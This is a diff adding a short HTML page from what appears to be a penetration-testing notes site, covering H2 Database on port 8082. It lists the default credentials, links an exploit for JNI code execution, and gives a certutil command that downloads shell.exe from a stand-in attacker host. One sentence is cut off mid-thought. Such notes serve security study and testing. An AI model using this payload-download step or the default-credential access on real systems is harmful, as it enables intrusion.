@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>H2 Database (8082/TCP)</h1>
+            <p>A free, open-source database management system that provides a lightweight, Java-based SQL database engine</p>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+                <ul>
+                <h3>Default credentials</h3>
+                    <pre><code class="language-bash">sa
+empty password</code></pre>
+                </ul>
+
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>H2 Database 1.4.199 - JNI Code Execution</h3>
+                <p>Using the following exploit you could be able to execute arbitrary code on the target system. <a class="notion-link" href="https://www.exploit-db.com/exploits/49384">Here</a></p>
+                <p>Just remember that when performing a certutil operation, do not provide <b>" "</b> Meaning </p>
+                <pre><code class="language-bash">certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe</code></pre>
+            </ul>
+        </div>
+    </div>
+
+
+</body>
+</html>
